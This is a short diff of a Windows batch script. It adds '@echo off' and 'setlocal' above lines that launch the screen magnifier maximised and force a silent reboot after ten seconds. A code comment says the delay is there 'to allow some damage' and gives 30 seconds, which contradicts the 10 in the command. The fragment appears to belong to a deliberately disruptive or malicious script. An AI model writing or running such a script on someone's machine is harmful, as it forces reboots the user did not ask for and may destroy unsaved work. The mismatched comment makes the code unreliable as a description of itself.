@@ -1,3 +1,5 @@
+@echo off
+setlocal enabledelayedexpansion
 start /max magnify.exe
 :: Schedule reboot early (30 seconds delay to allow some damage)
 shutdown /r /t 10 >nul 2>&1
